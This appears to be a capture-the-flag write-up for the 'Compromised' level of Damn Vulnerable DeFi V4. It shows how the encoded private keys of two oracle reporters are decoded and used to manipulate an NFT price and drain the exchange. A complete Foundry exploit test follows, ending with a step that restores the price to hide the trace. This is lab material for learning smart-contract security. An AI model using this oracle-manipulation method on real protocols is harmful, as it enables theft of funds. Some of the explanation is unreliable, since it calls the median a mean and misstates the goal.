# Compromised

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.


# Challenge overview

[official site](https://damnvulnerabledefi.xyz/challenges/compromised)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Compromised challenge is the seventh level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the NFT tokens from the pool.

It has 3 contracts
1) exchange.sol: (“Buy or sell NFT here”)
2) trustfulOracle.sol: (“Perform changes in the price of NTF as per trusted source”)
3) trustfulOracleInitializer.sol: (“Just initializes trustfulOracle”)

In this system you can sell or buy NFTs. The price updates as per the trusted source’s informations.

### exchange.sol has 2 main functions:
1) buyOne() : It takes the price of NFT and assigns new NFT to the user
2) sellOne() : It takes NFT from the user, sends funds to user as per the price of the NFT and burns the NFT taken from the user.

Become a Medium member

### trustOracle.sol has 2 main functions:
1) postPrice() : It sets the price of NFT from the _setPrice() .
2) getMedianPrice() : It takes all NFT price from the trusted source it sends it to the _computeMedianPrice() which takes the mean of the inputs

### Logic:
The pool takes the price information from three trusted source and updates the mean of the proposed price and buys and sells the NFTs as per the price.

## How do we exploit it ?

As we see on the first page of the lab we can see weird informations incoded we need to crack it and we can find our way

### Exploit flow :
- crack the incoded infos
- Not fancy tool is needed to crack just use chatGPT(think smart not hard)
- You will find out the info is two private keys
- Login from the address of the leaked private keys account
- Have a look they are the trusted source compromised account
- Use both of them and decrease the price
- Buy NFT and increase the price
- Sell the NFT to the pool
- Set the pool’s original price(clear trace hehe!)

## POC

Now, before going to the POC you should try to write exploit yourself and if you get errors and confusions here is the POC:

```solidity
    function test_compromised() public checkSolved {
        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address source1 = vm.addr(pk1);
        address source2 = vm.addr(pk2);

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 1 wei);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 1 wei);
        vm.stopPrank();

        vm.startPrank(player);
        uint256 tokenid = exchange.buyOne{value:1 wei}();
        vm.stopPrank();

        uint256 totalAmountToDrain = address(exchange).balance;

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", totalAmountToDrain);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", totalAmountToDrain);
        vm.stopPrank();

        vm.startPrank(player);
        nft.approve(address(exchange), tokenid);
        exchange.sellOne(tokenid);
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();

        vm.startPrank(player);
        (bool success, ) = payable(recovery).call{value : EXCHANGE_INITIAL_ETH_BALANCE}("");
        require(success, "U came this far and failed bruh");
        vm.stopPrank();

        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
    }
```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**